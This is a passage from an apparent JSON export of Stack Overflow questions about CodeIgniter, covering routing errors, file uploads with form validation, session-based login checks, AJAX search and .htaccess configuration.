HTTP/1.1\" 404 509 \"localhost/vn/\" \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.19 (KHTML, like Gecko) Ubuntu/11.04 Chromium/18.0.1025.151 Chrome/18.0.1025.151 Safari/535.19\"</p>\n</blockquote>\n\n<p>(SO didnt let me post http: before localhost)</p>\n\n<p>As you can see there is not .html over here. </p>\n\n<p>Here is the error_log file</p>\n\n<blockquote>\n  <p>[Fri Sep 07 11:29:03 2012] [error] [client 127.0.0.1] File does not exist: /var/www/vn/search.html/259, referer: //localhost/vn/</p>\n</blockquote>\n\n<p>But here, the \".html\" has been added.</p>\n\n<p>I have a rewrite_log with error_log reporting of 3. Here is the details</p>\n\n<blockquote>\n  <p>127.0.0.1 - - [07/Sep/2012:11:29:03 +052700] [localhost/sid#7f0f4ea297d8][rid#7f0f4ecd7db0/subreq] (1) [perdir /var/www/vn/] pass through /var/www/vn/search.html <br>\n  127.0.0.1 - - [07/Sep/2012:11:29:03 +052700] [localhost/sid#7f0f4ea297d8][rid#7f0f4ecd0d80/initial] (1) [perdir /var/www/vn/] pass through /var/www/vn/search.html</p>\n</blockquote>\n\n<p>Codeigniter log file also doesn't show anything of any value.</p>\n\n<p>Anybody, can help me out? This is working on Windows, and on the Linux Live Server, but in my Ubuntu Machine doesn't work? and only this controller, all other works fine.</p>\n\n<p>Any help would be much appreciated, as I donot know how to proceed further to solve this issue.</p>\n\n<p>Thank You</p>\n"},{"tags":["php","database","forms","codeigniter","function"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":58,"score":0,"question_id":12319705,"title":"How can I return the filename of the image upload to insert into DB?","body":"<p>Does anybody know how I can get the name of the file that has just been uploaded and then pass it to the index() function so it can be inserted into my database?</p>\n\n<p>It's written in codeigniter and here is the code from my Form Controller.</p>\n\n<p>Thanks.</p>\n\n<pre><code>public function index() {\n\n    $this-&gt;load-&gt;library('form_validation');\n\n    $this-&gt;form_validation-&gt;set_rules('nominee', 'Nominee', 'required');\n    $this-&gt;form_validation-&gt;set_rules('email', 'Email', 'required|valid_email|is_unique[self_nominees.email]');\n    $this-&gt;form_validation-&gt;set_rules('location', 'Location', 'required');\n    $this-&gt;form_validation-&gt;set_rules('category', 'Category', 'required');\n    $this-&gt;form_validation-&gt;set_rules('description', 'Description', 'required');\n    $this-&gt;form_validation-&gt;set_rules('imageupload', 'Image Upload', 'callback__image_upload');\n    $this-&gt;form_validation-&gt;set_rules('videoupload', 'Video Upload', 'callback__video_upload');\n\n    if ($this-&gt;form_validation-&gt;run() == FALSE)\n    {\n        //Load the form\n        $this-&gt;template('form.php');\n    }\n    else\n    {       \n        //Run code to add into the database\n        $formdata = $this-&gt;input-&gt;post(NULL, TRUE); // this prevent from XSS attacks\n        $this-&gt;load-&gt;model('users');\n        $this-&gt;users-&gt;self_nominate($formdata['nominee'], $formdata['email'], $formdata['location'], $formdata['category'], $formdata['description'], 'image', 'video');                                    \n\n        //Load the thankyou page\n        $this-&gt;template('thankyou.php');\n    }\n\n}\n\n/*----------------------------------------------------------------\n    Image Upload Function\n----------------------------------------------------------------*/\n\nfunction _image_upload()\n{\n      $this-&gt;load-&gt;library('upload');\n\n        // Check if there was a file uploaded\n        if (!empty($_FILES['imageupload']['name']))\n        {\n            // Specify configuration for File 1\n            $config['upload_path'] = 'uploads/images';\n            $config['allowed_types'] = 'gif|jpg|png';\n            $config['max_size'] = '100';\n            $config['max_width']  = '1024';\n            $config['max_height']  = '768';       \n\n            // Initialize config for File 1 \n            $this-&gt;upload-&gt;initialize($config);\n\n            // Upload file 1\n            if ($this-&gt;upload-&gt;do_upload('imageupload'))\n            {\n                $data = $this-&gt;upload-&gt;data();\n\n                return true;\n            }\n            else\n            {\n                $imageerrors = $this-&gt;upload-&gt;display_errors();\n                $this-&gt;form_validation-&gt;set_message('_image_upload', $imageerrors);\n\n                return false;\n            }\n\n        }\n\n}\n</code></pre>\n"},{"tags":["codeigniter","login"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":95,"score":0,"question_id":12318131,"title":"CodeIgniter User Authentication","body":"<p>I have authenticated users using code igniter successfully, but now if users type in the route to one the methods in one of my controllers, they can access it without logging in.</p>\n\n<p>I would like to stop this access to users which havent logged in preferably without using a 3rd party User Auth Plugin.</p>\n\n<p>I have this model code:</p>\n\n<pre><code>function login(){\n    $data = array(\n        'username' =&gt; $this-&gt;input-&gt;post('username'),\n        'logged_in' =&gt; TRUE\n    );\n    $this-&gt;session-&gt;set_userdata($data);\n} //function login()\nfunction logged_in(){\n    if($this-&gt;session-&gt;userdata('logged_in') == TRUE)\n    {\n        return TRUE;\n    }\n    return FALSE;\n} //function logged in()\n</code></pre>\n\n<p>I have this controller code:</p>\n\n<pre><code>    function index($condition = FALSE){\n    if($this-&gt;admin_model-&gt;logged_in() === TRUE)\n    {\n        $this-&gt;books_page(TRUE);\n    }\n    else\n    {\n        $data = $this-&gt;style_model-&gt;admin_area();\n        $data['page_intro'] = 'Oops! Sorry, you must be logged in to view this page.';\n        $this-&gt;load-&gt;view('admin/not_logged_in', $data);\n    }\n} //function index()\n    function books_page(){\n        $data = $this-&gt;style_model-&gt;admin_area();\n        $data['category_query'] = $this-&gt;admin_books_model-&gt;get_book_categories();\n        $data['page_title'] = 'Books';\n        $data['query'] = $this-&gt;admin_books_model-&gt;get_books();         \n        $this-&gt;load-&gt;view('admin/books/books_admin', $data);\n    }    //function books_page()\n</code></pre>\n\n<p>Users who have not logged in cannot access the books method but any other methods after this they can access, i simply want to stop that access and pass them the error page informing them that they have to login.</p>\n\n<p>Thanks in advance,\nTom</p>\n"},{"tags":["php","jquery","forms","codeigniter","jquery-ajax"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":69,"score":0,"question_id":12314522,"title":"form submissions with AJAX","body":"<p>So here is my problem in localhost. I am passing in the search parameter to my Home controller like:</p>\n\n<pre><code>&lt;form method=\"post\" action=\"&lt;?=site_url('home/index');?&gt;\"&gt; \n</code></pre>\n\n<p>When I do this, my ajax menu is populated correctly</p>\n\n<pre><code>       ----------\nSEARCH:| mot    |\n        ----------------------------\n       | motorcyles ...            |\n       | motorhomes ...            |\n       | motorola ..               |\n       -----------------------------\n</code></pre>\n\n<p>.</p>\n\n<p>On my web server, the only way to submit the form is with <code>&lt;form method=\"post\" action=\"&lt;?site_url('home/index');?&gt;\"&gt;</code> if I put the \"=\" in there, it does nothing. If I use</p>\n\n<pre><code>&lt;?php echo site_url('home/index');?&gt;\"&gt; \n</code></pre>\n\n<p>it will also display nothing.</p>\n\n<p>Additionally, when I type in search terms on my web server</p>\n\n<pre><code>        ----------\n SEARCH:| mot    |\n         ---------\n</code></pre>\n\n<p>nothing, no errors, no results. If I submit the form, I get back the correct results only after pressing submit.</p>\n\n<p>My controller is getting the correct results from the database, here is how I'm encoding my results array:</p>\n\n<pre><code>if ( $this-&gt;input-&gt; is_ajax_request())\n    {\n        $this-&gt;output-&gt;set_header(\"Cache-Control: no-cache, must-revalidate\");\n        $this-&gt;output-&gt;set_header(\"Expires:Mon, 4 Apr 1994 04:44:44 GMT\");\n        $this-&gt;output-&gt;set_header(\"Content-type:application/json\");\n\n        echo json_encode($results);\n        exit();\n\n    }\n\n    else {\n\n        $data['results'] = $results;\n\n         }\n</code></pre>\n\n<p>There are no errors with my js file. I have CSRF turned off. Why is this happening?</p>\n\n<pre><code>$(document).ready(function() {\n\n    var action= $('form').attr('action');\n    var results = $('#results');\n\n    function ajax_search(search) {\n\n        $.post(action, {\n            search: search\n        }, function(data) {\n\n            if(data.length) {\n\n                var el = $('&lt;ul/&gt;');\n\n                $.each(data,function(i,item){\n                    $(el).append('&lt;li&gt;&lt;span class=\"Course_Name\"&gt;' + \n                    item.course_name_highlighted + '&lt;/span&gt; &amp;ndash; &lt;span class=\"FirstName\"&gt;' + item.FirstName + '&lt;/span&gt; &amp;ndash; &lt;span class=\"LastName\"&gt;' \n                    + item.LastName + '&lt;/span&gt; &amp;ndash; &lt;span class=\"COURSE_ID\"&gt;'+item.COURSE_ID +'\\n&lt;/span&gt;&lt;/li&gt;');\n                });\n\n                $(results).empty().append(el);\n            }\n\n\n\n            else{\n                $(results).empty();\n            }\n        }, 'json');\n\n    }\n\n\n\n\n    $('#search').keyup(function() {\n\n        var search = $(this).val().replace(/^\\s+l\\s+$/g, \"\");\n\n        if(search.length &gt; 1)\n\n        {\n            clearTimeout($.data(this, 'timer'));\n\n            var wait = setTimeout(function() \n            {\n                ajax_search(search)\n\n            }, 400);\n\n            $.data(this,'timer', wait);\n        }\n\n    });\n\n});\n</code></pre>\n"},{"tags":["mysql","file","codeigniter","upload"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":39,"score":0,"question_id":12281286,"title":"Upload file with text boxes (Uploading is optional)","body":"<p>I have a form in which there are both types of fields means inputs text , radio , select , textarea and file upload fields.\nI am using the same form for insert and edit.\nMy problem is that i have to upload file and insert the data in the table.\nAlso the uploading is optonal. I have failed to find any logic to handle this. Can anyone suggest how i can do this task?</p>\n"},{"tags":["html","forms","codeigniter","input","upload"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":66,"score":0,"question_id":11791315,"title":"File upload with text fields in codeigniter using upload class","body":"<p>I have a form in which there are both types of fieldsmeans inputs text , radio , select , textarea and file upload fields.<br>\nI am using the same form for insert and edit.<br>\nMy problem is that i have to upload file and insert the data in the table.<br>\nController functions </p>\n\n<pre><code>function myUploadwithInsert(){\n\nif($category    =   $this-&gt;input-&gt;post())\n{\n    $this-&gt;load-&gt;library('form_validation');\n\n    if(!$this-&gt;imageUpload()){\n\n            $error = array('error' =&gt; $this-&gt;upload-&gt;display_errors());\n\n            $this-&gt;load-&gt;view('my_view', $error);\n\n    }else{\n\n        $this-&gt;form_validation-&gt;set_rules('name', 'Category Title', 'trim|required');\n\n        if ($this-&gt;form_validation-&gt;run() == TRUE)\n        {\n            if ($id = $this-&gt;categories_model-&gt;create($category))\n            {\n                redirect('admin/categories');\n            }\n        }else{\n            $this-&gt;load-&gt;view('my_view');\n        }           \n    }\n\n    }else{\n\n        $this-&gt;load-&gt;view('my_view');\n    }    \n} \n\npublic function uploadImage()\n{\n    $config['upload_path']      = './uploads/';\n    $config['allowed_types']    = 'gif|jpg|png|jpeg';\n    $config['max_size']     = '100';\n    $config['max_width']        = '1024';\n    $config['max_height']       = '768';\n\n    $this-&gt;load-&gt;library('upload', $config);        \n\n    if ( ! $this-&gt;upload-&gt;do_upload())\n    {\n        return false;\n    }\n    else\n    {\n        $data = $this-&gt;upload-&gt;data();\n\n        return $data;\n    }       \n\n} \n</code></pre>\n\n<p>Now the problem is that if image is uploaded and there come a form input error form will be displayed again user rectifies the form fields and fills the image field again. Then the image will be uploaded again.<br>\nThe same thing goes when i define the input condition first and then upload the same problem rises. How can i ivercome this problem? Is there anyother way to do this task.</p>\n"},{"tags":["php",".htaccess","codeigniter"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":59,"score":0,"question_id":12314886,"title":".htacces is not working with CodeIgniter 1.7.3, php 5.3","body":"<p>I tried to hide the index.php with .htaccess, CI 1.7.3 and php 5.3 and got an error 404.\nBut it’s working fine on my development server which is having php 5.2 and rest of all are the same configuration, i developed my application with HMVC and my .htaccess is</p>\n\n<pre><code>    RewriteEngine on\n    Options -Indexes\n    RewriteBase /myapp/\n\n    RewriteCond %{REQUEST_URI} !(\\.[a-zA-Z0-9]{1,5})$\n    RewriteCond %{REQUEST_FILENAME} !-f\n    RewriteRule ^(.*)$ /myapp/index.php?/$1 [L] \n</code></pre>\n\n<p>Anybody suggest me the way how can i resolve this issue should i upgrade my CI version ?</p>\n\n<p>Thanks</p>\n"},{"tags":[".htaccess","codeigniter","google-api"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":92,"score":0,"question_id":12315548,"title":"CodeIgniter 500 internal server error","body":"<p>I'm working on a website that manages personal informations about employees. And I'm using google Calendat API to manage their timesheet. I created a CodeIgniter project that displays, inserts, deletes and update events and it works. However, when I tried to integrate this with my website which is also based on CodeIgniter, insertion , deletion and update show a 500 internal server error. I read that this error may come from .htaccess. But I have the same .htaccess file for both of the two apps.\nHere is my .htaccess file :</p>\n\n<pre><code>Allow from localhost\nAllow from 127.0.0.1\nphp_flag allow_url_include 1\nDeny from all\n</code></pre>\n\n<p>For example , here is my function add_event (controller)</p>\n\n<pre><code> function add_event()\n    {   \n           $this-&gt;load-&gt;library('gcal');\n            $click_date = $this-&gt;input-&gt;post('start_date');\n            $date= explode(\"-\", $click_date);\n            $year= (int)$date[0];\n            $month= (int)$date[1];\n            $day= (int)$date[2]; \n            $title=$this-&gt;input-&gt;post('title');\n            $date_start = $this-&gt;unix_timestamp($year.'-'.$month.'-'.$day);\n\n\n            $params = array(\n            'calendarId'    =&gt; 'myLogin@gmail.com',\n            'allday'        =&gt; true, \n            'start'         =&gt; $date_start,\n            'end'       =&gt; $date_start,\n            'summary'       =&gt; $title,\n            'description'   =&gt; \"test\"\n        ); \n\n        $response = $this-&gt;gcal-&gt;eventInsert($params); \n                echo ' response';   \n\n        if($response)\n        {\n            echo \"true\";\n        } \n        else { echo \"false\"; }\n\n    }\n</code></pre>\n\n<p>Nothing is printed after `$response = $this->gcal->eventInsert($params);\nIn gcal.php, there is a problem with the second require:</p>\n\n<pre><code>require_once \"./application/third_party/google/src/apiClient.php\";\necho 'after require1 ';\nrequire_once \"./application/third_party/google/src/contrib/apiCalendarService.php\";\n</code></pre>\n\n<p>echo 'after require2';\n'after require2' isn't printed. And the only error according to Firebug is the 500 internal server error\n`\nCould anyone help me please?</p>\n\n<p>Thanks</p>\n"},{"tags":["php","codeigniter","file-upload","controller"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":46,"score":0,"question_id":12315696,"title":"Make image and video upload optional","body":"<p>I have a small app in codeigniter. There is a form that has 3 text fields, name,email,location. This is enough to submit. However there are two optional fields to all the user to submit either an image or video or both. I have it working until there is an error with the file uploaded. It will still submit the text data, when i want it to halt the whole submission until the error is fixed.</p>\n\n<p>Here is the code from my controller. Any help would be great. Thanks!</p>\n\n<pre><code>&lt;?php if ( ! defined('BASEPATH')) exit('No direct script access allowed');\n\nclass Form extends MY_Controller {\n\npublic function __construct()\n{\n    parent::__construct();\n    $this-&gt;load-&gt;helper(array('form', 'url'));\n}\n\nfunction index()\n    {\n        $this-&gt;load-&gt;helper(array('form', 'url'));\n\n        $this-&gt;load-&gt;library('form_validation');\n\n        $this-&gt;form_validation-&gt;set_rules('nominee', 'Nominee', 'required');\n        $this-&gt;form_validation-&gt;set_rules('email', 'Email', 'required|valid_email');\n        $this-&gt;form_validation-&gt;set_rules('location', 'Location', 'required');\n\n        if ($this-&gt;form_validation-&gt;run() == FALSE)\n        {\n            $this-&gt;load-&gt;view('form');\n        }\n        else\n        {\n             // Load the library - no config specified here\n                $this-&gt;load-&gt;library('upload');\n\n                // Check if there was a file uploaded - there are other ways to\n                // check this such as checking the 'error' for the file - if error\n                // is 0, you are good to code\n                if (!empty($_FILES['imageupload']['name']))\n                {\n                    // Specify configuration for File 1\n                    $config['upload_path'] = 'uploads/images';\n                    $config['allowed_types'] = 'gif|jpg|png';\n                    $config['max_size'] = '100';\n                    $config['max_width']  = '1024';\n                    $config['max_height']  = '768';       \n\n                    // Initialize config for File 1\n                    $this-&gt;upload-&gt;initialize($config);\n\n                    // Upload file 1\n                    if ($this-&gt;upload-&gt;do_upload('imageupload'))\n                    {\n                        $data = $this-&gt;upload-&gt;data();\n                    }\n                    else\n                    {\n                        echo $this-&gt;upload-&gt;display_errors();\n                    }\n\n                }\n\n                // Do we have a second file?\n                if (!empty($_FILES['videoupload']['name']))\n                {\n                    // Config for File 2 - can be completely different to file 1's config\n                    // or if you want to stick with config for file 1, do nothing!\n                    $config['upload_path'] = 'uploads/videos/';\n                    $config['allowed_types'] = 'gif|jpg|png';\n                    $config['max_size'] = '100';\n                    $config['max_width']  = '1024';\n                    $config['max_height']  = '768';\n\n                    // Initialize the new config\n                    $this-&gt;upload-&gt;initialize($config);\n\n                    // Upload the second file\n                    if ($this-&gt;upload-&gt;do_upload('videoupload'))\n                    {\n                        $data = $this-&gt;upload-&gt;data();\n                    }\n                    else\n                    {\n                        echo $this-&gt;upload-&gt;display_errors();\n                    }\n\n                }\n\n            $this-&gt;load-&gt;view('thankyou');\n            //Run code to add into the database\n        }\n    }\n\n}\n</code></pre>\n"},{"tags":["php","codeigniter","youtube"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":103,"score":-1,"question_id":9887834,"title":"ow to upload a video from a web application to youtube using php","body":"<p>I need to upload the video from a web application to youtube and need to get the url of the video uploaded as response. Can any one tell how to do dis using php. Thanks in advance. </p>\n"},{"tags":["php","codeigniter","rest","authentication","https"],"answer_count":0,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":97,"score":1,"question_id":12306734,"title":"Authentication for REST API's","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/599048/http-digest-authentication-versus-ssl\">HTTP Digest Authentication versus SSL</a>  </p>\n</blockquote>\n\n\n\n<p>I am using REST Controller in CodeIgnitor to implement a REST Api. I wanted to know if basic authentication over https will be good enough or should I go for digest. I'm also thinking that digest takes more time to process, But still safety is more important.</p>\n\n<p>Please also kindly let me know what are API keys, and how can I use them to add an extra layer of safety.</p>\n"},{"tags":["codeigniter","templates"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":32,"score":0,"question_id":12314885,"title":"Need help to convert html template to code igniter","body":"<p>Hi guys i am learning code igniter of my own. can you help me how to integrate the template in code igniter</p>\n"},{"tags":["php","codeigniter","object"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":49,"score":1,"question_id":12314192,"title":"Dynamic Object call in PHP","body":"<p>I develop in codeigniter. My program'll automaticly create it database, so i create for every table a createScheme() method. I try to call all these method like this:</p>\n\n<pre><code>public function createDB()\n{\n    $tables = array('user', 'manufacturer', 'device');\n\n    foreach ($tables as $i =&gt; $table) {\n        $this-&gt;load-&gt;library($table);\n        $this-&gt;{$table}::createScheme();\n    }\n\n}\n</code></pre>\n\n<p>This is create an error:</p>\n\n<blockquote>\n  <p>Parse error: syntax error, unexpected T_PAAMAYIM_NEKUDOTAYIM in\n  /var/www/clients/client0/web79/web/application/controllers/welcome.php\n  on line 22</p>\n</blockquote>\n\n<p>How can i do it?</p>\n"},{"tags":["codeigniter","codeigniter-2","hmvc"],"answer_count":1,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":277,"score":2,"question_id":11477772,"title":"Codeigniter HMVC + ciZacl login module attempt failing","body":"<p>refs: </p>\n\n<ul>\n<li><a href=\"https://bitbucket.org/wiredesignz/codeigniter-modular-extensions-hmvc/wiki/Home\" rel=\"nofollow\">https://bitbucket.org/wiredesignz/codeigniter-modular-extensions-hmvc/wiki/Home</a></li>\n<li><a href=\"http://applications.schizzoweb.com/cizacl/user_guide/\" rel=\"nofollow\">http://applications.schizzoweb.com/cizacl/user_guide/</a></li>\n<li><a href=\"http://codecanyon.net/item/codeigniter-acl-user-management/407499\" rel=\"nofollow\">http://codecanyon.net/item/codeigniter-acl-user-management/407499</a></li>\n</ul>\n\n<p>My Current Config: </p>\n\n<ul>\n<li>codeigniter 2.1.2</li>\n<li>clean install</li>\n<li>removed index.php via .htaccess</li>\n<li>installed modular extension via bitbucket mercurial repo</li>\n<li>configured clean database for cizacl </li>\n<li>attempted to convert cizacl to module [FAIL]</li>\n</ul>\n\n<p>I believe the problem is in the __construct line 26, and the mapping to the correct file? !<img src=\"http://i.stack.imgur.com/oiGbY.png\" alt=\"error\"><img src=\"http://i.stack.imgur.com/P6czh.png\" alt=\"code\"><img src=\"http://i.stack.imgur.com/HCiKa.png\" alt=\"Directory Structure\"></p>\n"},{"tags":["php","codeigniter","email","imap"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":134,"score":1,"question_id":12312210,"title":"PHP imap_search INBOX/SENT ITEMS","body":"<p>I need to search both <code>Inbox</code> and <code>Sent Items</code> with some criteria.</p>\n\n<p>Assume that the Email Id that i need to filter is <code>user@example.com</code></p>\n\n<ol>\n<li>Search in <code>INBOX</code> - <code>FROM</code>,<code>CC</code> field</li>\n<li><p>Search in <code>Sent Items</code> - <code>To</code> field</p>\n\n<p>$result= imap_search($conn, 'From \"user@example.com\" To \"user@example.com\"');</p></li>\n</ol>\n\n<p>I tried <code>imap_search</code> but its not working with multiple criteria.</p>\n\n<p>Also is it posible to search both <code>INBOX</code>  and <code>Sent Items</code> ?</p>\n\n<p>Thanks in advance.</p>\n"},{"tags":["codeigniter","controller","load"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":1451,"score":1,"question_id":4776399,"title":"codeigniter cannot load library","body":"<p>I have a problem that I can't load my library in my controller :S</p>\n\n<p>I got this error: Message: Undefined property: Profil::$profileWall</p>\n\n<p>My library:</p>\n\n<pre><code>&lt;?php if ( ! defined('BASEPATH')) exit('No direct script access allowed'); \n\nclass ProfileWall\n{\n\n    private $CI;\n\n    public function __construct()\n    {\n        $this-&gt;CI =&amp; get_instance();\n    }\n\n    public function wallShow()\n    {\n        $this-&gt;CI-&gt;load-&gt;model('profil_model');\n        return $this-&gt;CI-&gt;profil_model-&gt;wallGet($this-&gt;CI-&gt;uri-&gt;segment(3));\n    }\n}\n</code></pre>\n\n<p>and my controller</p>\n\n<pre><code>    function index()\n    {\n        $this-&gt;load-&gt;model('profil_model');\n        $data['query'] = $this-&gt;profil_model-&gt;vis_profil($this-&gt;uri-&gt;segment(3)); \n\n\n        //Henter lib profilwall så man kan vise wall beskeder i profilen\n        $this-&gt;load-&gt;library('profileWall');\n        $data['queryWall'] = $this-&gt;profileWall-&gt;wallShow();\n\n\n\n        $data['content'] = 'profil_view';\n        $this-&gt;load-&gt;view('includes/template', $data);\n\n\n}\n</code></pre>\n\n<p>What am I doing wrong?</p>\n"},{"tags":["php","image","codeigniter","file-upload"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":92,"score":0,"question_id":12304970,"title":"CodeIgniter Image Upload (Insert blank into array)","body":"<p>The form I'm working with contains info for five people. Optionally, the user can upload a photo for each of the five people. I'm attempting to insert a default image into the resulting array $files where an image is not uploaded. Help would be greatly appreciated.</p>\n\n<pre><code>function multiple_upload($upload_dir = APPPATH, $config = array())\n{\n    $CI =&amp; get_instance();\n    $files = array();\n\n    if(empty($config))\n    {\n        $config['upload_path']   = realpath($upload_dir . '/uploads');\n        $config['allowed_types'] = 'gif|jpg|jpeg|jpe|png';\n        $config['max_size']      = '2048';\n    }\n\n    $CI-&gt;load-&gt;library('upload', $config);\n\n    $errors = FALSE;\n    $this-&gt;load-&gt;library('image_lib');  // moved outside loop so it'll work\n    foreach($_FILES as $key =&gt; $value)\n    {\n        if( ! empty($value['name']))\n        {\n            if( ! $CI-&gt;upload-&gt;do_upload($key))\n            {\n                $data['upload_message'] = $CI-&gt;upload-&gt;display_errors(ERR_OPEN, ERR_CLOSE); // ERR_OPEN and ERR_CLOSE are error delimiters defined in a config file\n                $CI-&gt;load-&gt;vars($data);\n\n                $errors = TRUE;\n            }\n            else\n            {\n\n                // resize the saved image\n                $path = $CI-&gt;upload-&gt;data('full_path');\n                //echo $path['full_path'] . \"&lt;Br/&gt;\";\n                $config = array(\n                    'source_image' =&gt; $path['full_path'],\n                    'new_image' =&gt; $upload_dir . 'uploads/thumbs',\n                    'maintain_ration' =&gt; true,\n                    'width' =&gt; 150,\n                    'height' =&gt; 150\n                );\n\n                $this-&gt;image_lib-&gt;initialize($config);\n                $this-&gt;image_lib-&gt;resize();\n                // Build a file array from all uploaded files\n                $files[] = $CI-&gt;upload-&gt;data();\n\n\n            }\n        }\n    }\n\n    // There was errors, we have to delete the uploaded files\n    if($errors)\n    {\n        foreach($files as $key =&gt; $file)\n        {\n            @unlink($file['full_path']);\n        }\n    }\n    elseif(empty($files) AND empty($data['upload_message']))\n    {\n        $CI-&gt;lang-&gt;load('upload');\n        $data['upload_message'] = ERR_OPEN.$CI-&gt;lang-&gt;line('upload_no_file_selected').ERR_CLOSE;\n        $CI-&gt;load-&gt;vars($data);\n    }\n    else\n    {\n\n        return $files;\n\n    }\n\n}\n</code></pre>\n"},{"tags":["codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":78,"score":0,"question_id":12303695,"title":"Codeigniter Ajax - Not Working Getting Network Error","body":"<p>I am new to CI.</p>\n\n<p>I tried to make an ajax process. \nBut i am getting the following error.</p>\n\n<p><strong>NetworkError: 500 Internal Server Error - \nThe action you have requested is not allowed</strong></p>\n\n<p>Here is my code</p>\n\n<pre><code> &lt;script type=\"text/javascript\"&gt;\n    $(document).ready(function() {\n       $('#submit').click(function() {\n            var form_data = {\n            comment : $('#comment').val(),\n            ajax : '1'\n       };\n       $.ajax({\n          url: \"&lt;?php echo $this-&gt;config-&gt;item('base_url'); ?&gt;comment/insert\",\n          type: 'POST',\n          async : false,\n          data: form_data,\n          success: function(msg) {\n           $('#emsg').html(msg);\n          }\n       });\n      return false;\n   });\n });\n &lt;/script&gt;\n But when i access the url directly \n &lt;?php echo $this-&gt;config-&gt;item('base_url'); ?&gt;comment/insert\n</code></pre>\n\n<p>It's working correctly.</p>\n\n<p>So please help me to solve this issue.</p>\n\n<p>Thanks to all</p>\n"},{"tags":["forms","codeigniter","post"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":74,"score":0,"question_id":12305000,"title":"POST data not being set? Codeigniter solution","body":"<p>I think I have a simple bug somewhere but I can't see it!\nIn my view, I have the following javascript to create a form: </p>\n\n<pre><code>  $.ajax({\n    url:\"&lt;?php echo site_url('mycontroller/methodX/'.$ip.'/'.$hardwaremodel);?&gt;\",\n    type:'POST',\n    dataType:'json',\n    success: function(returnDataFromController) {\n    var htmlstring;\n    var submitFormHTML;\n    htmlstring = \"&lt;br&gt;&lt;br&gt;&lt;B&gt;To reassign the port to a new vlan, click on a VlanId below and then click on the OK button&lt;/B&gt;&lt;br&gt;&lt;table class='table table-bordered table-striped'&gt;\";\n    htmlstring = htmlstring + \"&lt;th&gt;VlanId&lt;/th&gt;&lt;th&gt;Name&lt;/th&gt;\";\n    for(i = 0; i &lt; returnDataFromController.length; i++) {\n\n    }\n    submitFormHTML = \"&lt;form method='post' accept-charset='utf-8' action='/myapp/index.php/controllerABC/methodABC/\"+ $('#ip').val() +\"/\" + $('#hardwaremodel').val() +\"/\" + $('#port').val() + \"'&gt;&lt;input type='text' id='newVlanID' style='width:5em;height:1.5em'/&gt;&amp;nbsp;&amp;nbsp;&lt;button type='submit' class='btn' id='saveVlan' style='width:10em;height:2em'&gt;Reassign Vlan&lt;/button&gt;&lt;/form&gt;\";\n    //alert(submitFormHTML);\n    $('#clientajaxcontainer').html(htmlstring);\n    $('#newvlanform').html(submitFormHTML);\n</code></pre>\n\n<p>It's the \"submitFormHTML\" string that builds the form. </p>\n\n<p>And in my controller I have the following logic to check for the input: \n    public function methodABC()\n    {</p>\n\n<pre><code>     if($_POST){\n         echo 'I am here';\n         $form = $this-&gt;input-&gt;post();\n         var_dump($form);\n         exit();\n     }\n     else {\n         echo \"false\";\n     }\n</code></pre>\n\n<p>It always print the \"false\".  I've also tried using: </p>\n\n<pre><code>print_r($this-&gt;input-&gt;post());\n</code></pre>\n\n<p>and </p>\n\n<pre><code>    echo $this-&gt;input-&gt;post('newID');\n</code></pre>\n\n<p>But I can't seem to get the data from my view into the controller. \nCan you see where I'm going wrong?  Thanks for the help.</p>\n\n<p><strong>Edit:</strong> </p>\n\n<p>The page when rendered, creates the following HTML for the form: </p>\n\n<pre><code>&lt;form method=\"post\" action=\"/myapp/index.php/switches/changeportvlan/11.11.11.11 /\"&gt;\n&lt;input type='text' id='newVlanID' style='width:5em;height:1.5em'/&gt;&amp;nbsp;&amp;nbsp;\n&lt;button type=\"submit\" class='btn' id='saveVlan' style='width:10em;height:2em'&gt;Reassign Vlan&lt;/button&gt;\n&lt;/form&gt;\"\n</code></pre>\n"},{"tags":["php","codeigniter","kohana","kohana-auth"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":2696,"score":2,"question_id":3793087,"title":"PHP framework with good user login/admin","body":"<p>I am looking for a good PHP framework with a good user login &amp; admin.  I have looked at Codeigniter, but the user admins I have found seem dated.  I have been looking at at Kohana, but have not been able to find a viable login / admin pannel?  I basically need:</p>\n\n<ul>\n<li>User login</li>\n<li>User verification of new user</li>\n<li>User p/w reset</li>\n<li>Admin add/edit/del user</li>\n<li>Admin user grouping</li>\n</ul>\n\n<p>Any suggestions?</p>\n"}]}
